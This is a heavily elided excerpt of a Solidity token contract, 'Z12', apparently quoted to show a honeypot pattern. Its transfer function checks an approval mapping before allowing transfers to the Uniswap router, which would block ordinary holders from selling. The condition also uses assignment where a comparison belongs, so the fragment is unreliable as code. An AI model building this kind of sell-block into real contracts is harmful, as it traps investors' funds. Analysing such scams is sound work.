...
contract Z12 is Context, IERC20, Ownable {
    ...
    string private _name = 'Z12';
    string private _symbol = 'Z12';
...
constructor () public {
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal {
        ...
        //router is the token's Uniswap pool
        if (_approved[sender] = false && recipient == router) {
